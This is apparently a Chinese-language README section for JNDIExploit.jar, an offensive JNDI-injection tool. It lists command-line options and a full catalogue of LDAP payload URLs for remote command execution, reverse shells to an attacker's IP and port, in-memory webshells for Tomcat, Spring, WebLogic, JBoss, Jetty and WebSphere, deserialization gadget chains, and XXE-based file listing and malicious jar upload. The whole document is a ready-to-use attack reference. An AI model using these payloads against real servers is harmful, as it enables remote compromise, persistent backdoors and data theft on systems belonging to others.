## JNDI文件夹
###用法
java -jar JNDIExploit.jar -h查看参数
```
Usage: java -jar JNDIExploit.jar [options]
  Options:
  * -i, --ip       Local ip address
    -l, --ldapPort Ldap bind port (default: 1389)
    -p, --httpPort Http bind port (default: 8080)
    -u, --usage    Show usage (default: false)
    -h, --help     Show this help
```
使用 java -jar JNDIExploit.jar -u 查看支持的 LDAP 格式
```
Supported LADP Queries
* all words are case INSENSITIVE when send to ldap server

[+] Basic Queries: ldap://127.0.0.1:1389/Basic/[PayloadType]/[Params], e.g.
    ldap://127.0.0.1:1389/Basic/Dnslog/[domain]
    ldap://127.0.0.1:1389/Basic/Command/[cmd]
    ldap://127.0.0.1:1389/Basic/Command/Base64/[base64_encoded_cmd]
    ldap://127.0.0.1:1389/Basic/ReverseShell/[ip]/[port]  ---windows NOT supported
    ldap://127.0.0.1:1389/Basic/TomcatEcho
    ldap://127.0.0.1:1389/Basic/SpringEcho
    ldap://127.0.0.1:1389/Basic/WeblogicEcho
    ldap://127.0.0.1:1389/Basic/TomcatMemshell1
    ldap://127.0.0.1:1389/Basic/TomcatMemshell2  ---need extra header [Shell: true]
    ldap://127.0.0.1:1389/Basic/JettyMemshell
    ldap://127.0.0.1:1389/Basic/WeblogicMemshell1
    ldap://127.0.0.1:1389/Basic/WeblogicMemshell2
    ldap://127.0.0.1:1389/Basic/JBossMemshell
    ldap://127.0.0.1:1389/Basic/WebsphereMemshell
    ldap://127.0.0.1:1389/Basic/SpringMemshell

[+] Deserialize Queries: ldap://127.0.0.1:1389/Deserialization/[GadgetType]/[PayloadType]/[Params], e.g.
    ldap://127.0.0.1:1389/Deserialization/URLDNS/[domain]
    ldap://127.0.0.1:1389/Deserialization/CommonsCollectionsK1/Dnslog/[domain]
    ldap://127.0.0.1:1389/Deserialization/CommonsCollectionsK2/Command/Base64/[base64_encoded_cmd]
    ldap://127.0.0.1:1389/Deserialization/CommonsBeanutils1/ReverseShell/[ip]/[port]  ---windows NOT supported
    ldap://127.0.0.1:1389/Deserialization/CommonsBeanutils2/TomcatEcho
    ldap://127.0.0.1:1389/Deserialization/C3P0/SpringEcho
    ldap://127.0.0.1:1389/Deserialization/Jdk7u21/WeblogicEcho
    ldap://127.0.0.1:1389/Deserialization/Jre8u20/TomcatMemshell1
    ldap://127.0.0.1:1389/Deserialization/CVE_2020_2555/WeblogicMemshell1
    ldap://127.0.0.1:1389/Deserialization/CVE_2020_2883/WeblogicMemshell2    ---ALSO support other memshells

[+] TomcatBypass Queries
    ldap://127.0.0.1:1389/TomcatBypass/Dnslog/[domain]
    ldap://127.0.0.1:1389/TomcatBypass/Command/[cmd]
    ldap://127.0.0.1:1389/TomcatBypass/Command/Base64/[base64_encoded_cmd]
    ldap://127.0.0.1:1389/TomcatBypass/ReverseShell/[ip]/[port]  ---windows NOT supported
    ldap://127.0.0.1:1389/TomcatBypass/TomcatEcho
    ldap://127.0.0.1:1389/TomcatBypass/SpringEcho
    ldap://127.0.0.1:1389/TomcatBypass/TomcatMemshell1
    ldap://127.0.0.1:1389/TomcatBypass/TomcatMemshell2   ---need extra header [Shell: true]
    ldap://127.0.0.1:1389/TomcatBypass/SpringMemshell

[+] GroovyBypass Queries
    ldap://127.0.0.1:1389/GroovyBypass/Command/[cmd]
    ldap://127.0.0.1:1389/GroovyBypass/Command/Base64/[base64_encoded_cmd]

[+] WebsphereBypass Queries
    ldap://127.0.0.1:1389/WebsphereBypass/List/file=[file or directory]
    ldap://127.0.0.1:1389/WebsphereBypass/Upload/Dnslog/[domain]
    ldap://127.0.0.1:1389/WebsphereBypass/Upload/Command/[cmd]
    ldap://127.0.0.1:1389/WebsphereBypass/Upload/Command/Base64/[base64_encoded_cmd]
    ldap://127.0.0.1:1389/WebsphereBypass/Upload/ReverseShell/[ip]/[port]  ---windows NOT supported
    ldap://127.0.0.1:1389/WebsphereBypass/Upload/WebsphereMemshell
    ldap://127.0.0.1:1389/WebsphereBypass/RCE/path=[uploaded_jar_path]   ----e.g: ../../../../../tmp/jar_cache7808167489549525095.tmp
```

```
目前支持的所有 PayloadType 为
Dnslog: 用于产生一个DNS请求，与 DNSLog平台配合使用，对Linux/Windows进行了简单的适配
Command: 用于执行命令，如果命令有特殊字符，支持对命令进行 Base64编码后传输
ReverseShell: 用于 Linux 系统的反弹shell，方便使用
TomcatEcho: 用于在中间件为 Tomcat 时命令执行结果的回显，通过添加自定义header cmd: whoami 的方式传递想要执行的命令
SpringEcho: 用于在框架为 SpringMVC/SpringBoot 时命令执行结果的回显，通过添加自定义header cmd: whoami 的方式传递想要执行的命令
WeblogicEcho: 用于在中间件为 Weblogic 时命令执行结果的回显，通过添加自定义header cmd: whoami 的方式传递想要执行的命令
TomcatMemshell1: 用于植入Tomcat内存shell， 支持Behinder shell 与 Basic cmd shell
TomcatMemshell2: 用于植入Tomcat内存shell， 支持Behinder shell 与 Basic cmd shell, 使用时需要添加额外的HTTP Header Shell: true, 推荐使用此方式
SpringMemshell: 用于植入Spring内存shell， 支持Behinder shell 与 Basic cmd shell
WeblogicMemshell1: 用于植入Weblogic内存shell， 支持Behinder shell 与 Basic cmd shell
WeblogicMemshell2: 用于植入Weblogic内存shell， 支持Behinder shell 与 Basic cmd shell，推荐使用此方式
JettyMemshell: 用于植入Jetty内存shell， 支持Behinder shell 与 Basic cmd shell
JBossMemshell: 用于植入JBoss内存shell， 支持Behinder shell 与 Basic cmd shell
WebsphereMemshell: 用于植入Websphere内存shell， 支持Behinder shell 与 Basic cmd shell
目前支持的所有 GadgetType 为
URLDNS
CommonsBeanutils1
CommonsBeanutils2
CommonsCollectionsK1
CommonsCollectionsK2
C3P0
Jdk7u21
Jre8u20
CVE_2020_2551
CVE_2020_2883
WebsphereBypass 中的 3 个动作：
list：基于XXE查看目标服务器上的目录或文件内容
upload：基于XXE的jar协议将恶意jar包上传至目标服务器的临时目录
rce：加载已上传至目标服务器临时目录的jar包，从而达到远程代码执行的效果（这一步本地未复现成功，抛java.lang.IllegalStateException: For application client runtime, the client factory execute on a managed server thread is not allowed.异常，有复现成功的小伙伴麻烦指导下）
```